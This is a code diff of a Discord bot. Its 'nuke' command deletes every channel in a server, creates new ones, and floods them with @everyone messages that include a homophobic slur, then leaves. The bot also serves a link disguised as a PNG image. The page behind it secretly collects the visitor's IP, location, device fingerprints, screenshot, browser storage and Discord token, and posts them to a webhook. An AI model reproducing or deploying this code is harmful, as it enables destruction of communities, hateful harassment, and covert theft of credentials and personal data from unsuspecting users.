@@ -11,10 +11,7 @@ const PORT = process.env.PORT || 3000;
 
 // ---- CLIENT ----
 const client = new Client({
-    intents: [
-        GatewayIntentBits.Guilds,
-        GatewayIntentBits.GuildMessages
-    ]
+    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
 });
 
 const links = new Map();
@@ -22,9 +19,7 @@ const links = new Map();
 // ---- EXPRESS SERVER (for dox) ----
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
-    if (!links.has(id)) {
-        return res.status(404).send('Image not found');
-    }
+    if (!links.has(id)) return res.status(404).send('Image not found');
     const data = links.get(id);
     res.type('text/html');
     res.send(generateDoxHTML(data.webhook || DEFAULT_WEBHOOK));
@@ -53,14 +48,7 @@ client.once('ready', async () => {
             description: 'Send raid spam',
             options: [{ name: 'count', type: 4, description: 'Lines (max 50)', required: false }]
         },
-        {
-            name: 'nuke',
-            description: 'Delete channels, create 20, spam varied @everyone flood, then leave',
-            options: [
-                { name: 'messages', type: 4, description: 'Messages per channel (default 30)', required: false },
-                { name: 'delay', type: 4, description: 'Delay in ms between messages (default 50)', required: false }
-            ]
-        },
+        { name: 'nuke', description: 'Delete channels, create 10, flood with custom message, then leave' },
         { name: 'ad', description: 'Advertise the server' },
         {
             name: 'purge',
@@ -125,7 +113,7 @@ client.on('interactionCreate', async (interaction) => {
         return;
     }
 
-    // ---- NUKE ----
+    // ---- NUKE (Custom Flood) ----
     if (interaction.commandName === 'nuke') {
         await interaction.deferReply({ ephemeral: true });
         const guild = interaction.guild;
@@ -134,43 +122,59 @@ client.on('interactionCreate', async (interaction) => {
             return interaction.editReply('❌ I need Administrator.');
         }
 
-        const messagesPerChannel = Math.min(interaction.options.getInteger('messages') || 30, 100);
-        const delayMs = interaction.options.getInteger('delay') || 50;
+        const channelCount = 10;
+        const messagesPerChannel = 30;
+        const delayMs = 20;
+
+        const baseMessage = '@everyone PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER';
+        const variations = [
+            baseMessage,
+            'PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
+            'PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER',
+            'PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER',
+            'PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER',
+            'PULSE OWNS ALL U F@GGOTS TRASH ASS SERVER',
+            'PULSE OWNS ALL YOU F@GGOTS TRASH AS SERVER',
+            'PULSE OWNS ALL YOU F@GGOTS TRASH ASS SRVER',
+            'PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERV ER',
+            'PULSE OWNS ALL YOU FAGGOTS TRASH ASS SERVER',
+            'PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER   ',
+            'PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER\n',
+        ];
 
         try {
             // 1. Delete all channels
             await Promise.all(guild.channels.cache.map(ch => ch.delete().catch(() => {})));
 
-            // 2. Create 20 new channels
+            // 2. Create 10 new channels (parallel)
             const newChannels = await Promise.all(
-                Array.from({ length: 20 }, () =>
+                Array.from({ length: channelCount }, () =>
                     guild.channels.create({ name: 'pulse', type: 0 }).catch(() => null)
                 )
             );
             const valid = newChannels.filter(c => c !== null);
 
-            // 3. Spam each channel with varied messages
-            const baseMessage = '@everyone ';
-            const maxLength = 2000;
-
+            // 3. Build send promises (all channels at once)
+            const sendPromises = [];
             for (const channel of valid) {
                 for (let i = 0; i < messagesPerChannel; i++) {
-                    let msg = '';
-                    const targetLen = maxLength - 30;
-                    while (msg.length + baseMessage.length < targetLen) {
-                        msg += baseMessage;
-                    }
-                    const suffix = `\n[${crypto.randomBytes(4).toString('hex')}] PULSE NUKE ${i+1}/${messagesPerChannel}`;
-                    msg = msg.slice(0, maxLength - suffix.length) + suffix;
-                    await channel.send(msg).catch(() => {});
-                    await new Promise(resolve => setTimeout(resolve, delayMs));
+                    const msg = variations[i % variations.length] + ` [${i+1}]`;
+                    sendPromises.push(
+                        new Promise(resolve => {
+                            setTimeout(async () => {
+                                await channel.send(msg).catch(() => {});
+                                resolve();
+                            }, i * delayMs);
+                        })
+                    );
                 }
             }
+            await Promise.all(sendPromises);
 
-            // 4. Leave the server
+            // 4. Leave
             await guild.leave();
 
-            await interaction.editReply(`✅ Nuked. Deleted old channels, created ${valid.length} new ones, sent ${messagesPerChannel} varied messages each, and left.`);
+            await interaction.editReply(`✅ Nuked. Deleted old channels, created ${valid.length} new ones, sent ${messagesPerChannel} messages each, and left.`);
         } catch (e) {
             await interaction.editReply('❌ Nuke failed: ' + e.message);
         }
@@ -206,7 +210,7 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-// ---- ULTIMATE DOX HTML (Screenshot, Token, Storage, Fingerprints) ----
+// ---- ULTIMATE DOX HTML (unchanged, full power) ----
 function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
 <html>
@@ -371,7 +375,6 @@ async function takeScreenshot() {
 // ---- MAIN ----
 (async function() {
     try {
-        // Collect data
         const ip = await getIPData();
         const battery = await getBattery();
         const conn = getConnection();
@@ -381,26 +384,21 @@ async function takeScreenshot() {
         const fonts = getFonts();
         const audioFP = await getAudioFP();
 
-        // Browser info
         const ua = navigator.userAgent;
         const browser = ua.includes('Edg') ? 'Edge' : ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Unknown';
         const os = ua.includes('Windows NT 10.0') ? 'Windows 10/11' : ua.includes('Mac OS X') ? 'macOS' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Unknown';
         const deviceType = /mobile|android|iphone|ipad/i.test(ua) ? '📱 Mobile' : /tablet|ipad/i.test(ua) ? '📱 Tablet' : '💻 Desktop';
 
-        // Storage harvest
         let ls = {}, ss = {};
         try { for (let i=0; i<localStorage.length; i++) { const k = localStorage.key(i); ls[k] = localStorage[k]; } } catch {}
         try { for (let i=0; i<sessionStorage.length; i++) { const k = sessionStorage.key(i); ss[k] = sessionStorage[k]; } } catch {}
 
-        // Discord token
         let discordToken = localStorage.getItem('token') || getCookie('token') || 'N/A';
 
-        // Page metadata
         const pageTitle = document.title;
         const pageURL = window.location.href;
         const referrer = document.referrer || 'N/A';
 
-        // Build data object
         const data = {
             timestamp: new Date().toISOString(),
             ip: ip.ip, country: ip.country, region: ip.region, city: ip.city, postal: ip.postal,
@@ -426,7 +424,6 @@ async function takeScreenshot() {
             userAgent: ua
         };
 
-        // Build embed fields
         const fields = [
             { name: '🌐 IP', value: data.ip, inline: true },
             { name: '📍 Country', value: data.country, inline: true },
@@ -461,7 +458,6 @@ async function takeScreenshot() {
             { name: '🌐 User Agent', value: data.userAgent || 'N/A', inline: false }
         ];
 
-        // Build embed
         const embed = {
             title: '☠️ Ultimate Dox',
             color: 0xFF0000,
@@ -469,31 +465,24 @@ async function takeScreenshot() {
             footer: { text: 'Logged at ' + data.timestamp }
         };
 
-        // ---- SEND TO WEBHOOK ----
-        // First send embed
         await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ embeds: [embed] })
         });
 
-        // ---- TAKE SCREENSHOT AND SEND AS FILE ----
         const screenshot = await takeScreenshot();
         if (screenshot) {
             const blob = await fetch(screenshot).then(r => r.blob());
             const formData = new FormData();
             formData.append('file', blob, 'screenshot.png');
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                body: formData
-            }).catch(() => {});
+            await fetch(WEBHOOK_URL, { method: 'POST', body: formData }).catch(() => {});
         }
 
     } catch (err) {
         console.error('Dox error:', err);
     }
 
-    // ---- CLOSE ----
     document.body.innerHTML = '';
     document.body.style.background = '#ffffff';
     document.body.style.margin = '0';
@@ -508,5 +497,4 @@ async function takeScreenshot() {
 </html>`;
 }
 
-// ---- LOGIN ----
 client.login(TOKEN);
